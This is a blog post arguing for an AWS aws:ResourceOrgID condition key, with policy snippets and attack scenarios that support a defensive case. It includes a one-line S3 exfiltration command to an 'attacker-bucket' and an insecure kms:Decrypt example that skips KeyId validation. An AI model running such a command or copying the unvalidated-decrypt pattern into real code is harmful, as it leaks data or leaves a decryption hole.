---
layout: post
title:  AWS IAM needs aws:ResourceOrgID
date:
  created: 2020-09-29T02:12:52
categories:
  - AWS
---

<!-- more -->

## Update

In April 2022, AWS released `aws:ResourceOrgID` (and a couple of other related
condition keys). This [blog post][launch-post] does a great job of describing 
how it works. I'll leave the rest of this blog post in place for historical
interest, but it's now outdated.

## Background

In May 2018, AWS [released][aws-blog] a new IAM condition key, `aws:PrincipalOrgID`.
This was a game-changer for improving security posture as it made the dream of
extremely granular AWS accounts that much more achievable. I won't go into
detail on why it was so useful as I'm sure others have written much better
explanations than I could.

The existence of `aws:PrincipalOrgID` made writing some _resource_-based policies
much easier. In the same theme, a hypothetical `aws:ResourceOrgID` condition key
would be extremely useful for _identity_-based policies, service control policies
and VPC endpoint policies. I'm not alone in thinking this. For example, in
Square's [blog post][square-blog] on adoption of VPC endpoints they wrote this:

> There is a limit of 20,480 characters on VPC Endpoint Policies. While this may 
> suffice for most use-cases, at Square we currently have close to 200 AWS accounts 
> and are expected to add hundreds more AWS accounts as more teams build in the 
> cloud. We calculated that with our policy specification, we cannot list more 
> than approximately 800 AWS accounts. In order to monitor this we have a graph 
> of the VPC Endpoint Policy text sizes (in number of characters) and have an 
> alarm set if that reaches into the ten thousand characters.
>
> If AWS offers a `aws:ResourceOrgID` IAM conditional context key, similar to 
> the `aws:PrincipalOrgID` conditional context key, we would not have to manually 
> list AWS accounts in the resources section.

Additionally, this is a frequent topic of ~~complaining~~ discussion in the
Cloud Security Forum:

![screenshot](/assets/2020-09-29-cloudsecurityforum.png)

## Arguments for aws:ResourceOrgID

Something to keep in mind is that these scenarios may seem trivial to fix: it's
a matter of "duh, don't do that thing" and that is indeed often true of the
demographics that might read this blog. But there are large orgs that have
hundreds to thousands of developers of *significantly* differing levels of
AWS proficiency. That's where an SCP like the following can be exceedingly
useful:

```json
{
    "Effect": "Deny",
    "Action": "kms:Decrypt",
    "Condition": {
        "StringNotEquals": {
            "aws:ResourceOrgID": "o-my-org-id"
        }
    }
}
```

Scenario one: Imagine a scenario wherein an attacker has gained control of an 
EC2 instance with an IAM policy that has `s3:PutObject` permissions on `*` 
resources. The attacker could exfiltrate data to a bucket that they own by 
running `aws s3 cp sensitive-file s3://attacker-bucket/`. This usually should 
be prevented by being explicit about buckets that it has write access to. But
for argument's sake, it needs unbounded access. This could be made safer by
adding a condition that the instance role can only write to buckets owned by
the org.

Scenario two: An attacker can trivially circumvent the protection in scenario
one by using their own access key ID instead of the instance's to perform the 
file upload. This is where the condition key would be useful in a VPC endpoint:
any same-region traffic to S3 could be restricted to buckets owned by the org
by including an `aws:ResourceOrgID` condition key.

Scenario three: You are running a centrally-administered EKS/ECS cluster. Images
are stored in ECR repositories across the org. You want to prevent attackers from
specifying that an image hosted in an attacker-owned account should be run -
the condition key helps here too. Likewise with ECR VPC endpoint policies.

Scenario four: An attacker convinces your application to call `kms:Decrypt` on
an attacker-provided ciphertext that has been encrypted with a KMS CMK
owned by the attacker. The attacker's CMK has a key policy that grants `kms:Decrypt`
to `*` principals and your application has an IAM policy that grants `kms:Decrypt`
on `*` keys.

## The problem with KMS keys

I think scenario four warrants the most thought. In my (limited, anecdotal) 
experience AWS KMS is the service that suffers in terms of the ratio of
being poorly understood relative to how critical it is. There's also some
unfortunate gotchas in the user experience that make security issues more likely.

The first issue concerns the relationship between KMS key IDs, key aliases and
IAM principal policies. When you _use_ a KMS key, you're usually calling one
of the KMS APIs (like `Decrypt`, `Encrypt`, etc) with a key *alias*, e.g.:

```javascript
    kmsClient.encrypt({ 
        Plaintext = someSensitiveUserData, 
        KeyId = "alias/MyEncryptionKey" 
    })
```

This is a much more pleasant dev experience than passing in a key ID, which is
an opaque GUID. This is doubly the case if you are using multiple AWS regions
and/or multiple AWS accounts: it's very tempting to use the same alias in
each environment so you don't need to make your code configurable.

Where this experience falls down is in assigning permissions. The first thing
a developer will try is the following IAM policy statement:

```yaml
- Effect: Allow
  Action: [kms:Encrypt, kms:Decrypt]
  Resource: !Sub arn:aws:kms:${AWS::Region}:${AWS::AccountId}:alias/MyEncryptionKey
```

This will fail. The resource must be the **key ID**. So what are they going to 
do? They have a few lousy options:

* Make the key ID a template parameter. This now makes instantiating the template
  more annoying.
* Add all the key IDs to a `Mappings` section. This now makes the `Resource` field
  more effort _and_ uglier. You might call this petty, but would you say developers
  aren't petty?
* Change the statement to be `Resource: "*"`. And why wouldn't they? It's substantially
  easier, guaranteed to work and the attack scenarios aren't immediately apparent. 
  How insecure could it be when the key alias is hardcoded in the app?

The issue only arises when the app later calls `kms:Decrypt` if the ciphertext
is provided by the user. The issue is that an attacker can provide a ciphertext
encrypted with *their* key. `kms:Decrypt` supports an *optional* `KeyId` 
parameter, but 99% of the time I see the following usage:

```javascript
    const resp = await kmsClient.decrypt({ CiphertextBlob = someCiphertextString });
    const decrypted = resp.Plaintext;
    // some code that uses the decrypted value
```

This works because the key ID is encoded into the ciphertext blob returned by
`kms:Encrypt`. It's very handy because you don't need to record the key ID alongside
the encrypted data! And it's typically pretty secure, because if an attacker 
tries to modify the ciphertext, it becomes invalid and returns and error as
the cipher is authenticated. This in combination with the hardcoded encryption
key will lead most developers to feeling confident in the security of the system
as-is.

But that authentication **counts for nothing** if you don't validate that the 
`resp.KeyId` matches the `KeyId` that you passed to the `kms:Encrypt` API call.

I suspect that this problem is more likely to occur than you might first guess.
Think of scenarios like a Dropbox app, where the backend encrypts users' files
that are then stored on users' machines. The authenticated nature of the ciphertext
would lead most reasonable developers to believe the data is tamper-proof.

It's for this reason that I think an `aws:ResourceOrgID` condition key would be
extremely useful for AWS Organization SCPs: to deny the very uncommon scenario
of cross-org encryption/decryption. In the unlikely scenario that is part of
your workflow, it can always be narrowed down to not deny usage of cross-org
keys by suitably tagged IAM principals.

## What does AWS have to say about all this?

The [`kms:Decrypt`][docs] do actually have a bit to say on this, but it's not
spelled out as clearly as might be necessary for someone without sufficient
pre-existing background. The relevant excerpts:

> [s]pecifying the CMK is always recommended as a best practice. When you use 
> the KeyId parameter to specify a CMK, AWS KMS only uses the CMK you specify. 
> If the ciphertext was encrypted under a different CMK, the Decrypt operation 
> fails. This practice ensures that you use the CMK that you intend.
>
> Whenever possible, use key policies to give users permission to call the Decrypt 
> operation on a particular CMK, instead of using IAM policies. Otherwise, you
> might create an IAM user policy that gives the user Decrypt permission on all 
> CMKs. This user could decrypt ciphertext that was encrypted by CMKs in other 
> accounts if the key policy for the cross-account CMK permits it. If you 
> must use an IAM policy for Decrypt permissions, limit the user to particular 
> CMKs or particular trusted accounts. 
>
> [...]
> 
> `KeyId`
> [...] If you used a symmetric CMK, AWS KMS can get the CMK from metadata that 
> it adds to the symmetric ciphertext blob. However, it is always recommended 
> as a best practice. This practice ensures that you use the CMK that you intend.

## You're wrong

I probably am wrong. Or maybe I've misestimated the likelihood of something. Or
very likely: I've not considered another great reason why this would be a wonderful
new condition key. Please reach out to me on Twitter and share your thoughts.

[launch-post]: https://aws.amazon.com/blogs/security/how-to-control-access-to-aws-resources-based-on-aws-account-ou-or-organization/
[aws-blog]: https://aws.amazon.com/blogs/security/control-access-to-aws-resources-by-using-the-aws-organization-of-iam-principals/
[square-blog]: https://developer.squareup.com/blog/adopting-aws-vpc-endpoints-at-square/
[docs]: https://docs.aws.amazon.com/kms/latest/APIReference/API_Decrypt.html
